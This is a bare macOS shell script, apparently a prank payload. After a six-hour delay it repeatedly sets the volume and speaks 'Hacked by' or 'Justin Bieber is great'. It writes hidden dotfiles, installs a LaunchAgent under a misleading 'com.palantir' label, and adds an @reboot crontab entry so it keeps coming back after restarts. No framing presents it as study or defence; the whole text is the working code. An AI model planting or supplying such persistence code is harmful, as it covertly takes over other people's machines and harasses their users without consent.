screen -dmS justin bash -c "sleep 21600; while true; do sleep 4; osascript -e \"set Volume 10\"; say \"Hacked by \"; cat /usr/share/dict/words | perl -e 'print join(\"\", sort { rand(1) <=> 0.5 } <>);' | head -n 1 | say ;  done;"

cat <<EOF > ~/.bieber
while true; do sleep 20; osascript -e "set Volume 10"; say "Justin Bieber is great";  done;
EOF

cat <<EOF > ~/.pconfiguration
osascript -e "set Volume 10"; say "Trying to hack the"; cat /usr/share/dict/words | perl -e 'print join("", sort { rand(1) <=> 0.5 } <>);' | head -n 1 | say;
EOF

chmod +x ~/.bieber
chmod +x ~/.pconfiguration

cat <<EOF > ~/Library/LaunchAgents/com.palantir.bieber.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.palantir.bieber</string>

  <key>ProgramArguments</key>
  <array>
    <string>~/.pconfiguration</string>
  </array>

  <key>Nice</key>
  <integer>1</integer>

  <key>StartInterval</key>
  <integer>60</integer>

  <key>RunAtLoad</key>
  <true/>

  <key>StandardErrorPath</key>
  <string>/tmp/AlTest1.err</string>

  <key>StandardOutPath</key>
  <string>/tmp/AlTest1.out</string>
</dict>
</plist>
EOF

crontab -l > /tmp/cron
echo "@reboot ~/.bieber" >> /tmp/cron
crontab /tmp/cron

echo "Sleeping for 6 hours";
sleep 21600;
launchctl load ~/Library/LaunchAgents/com.palantir.bieber.plist
/bin/bash ~/.bieber
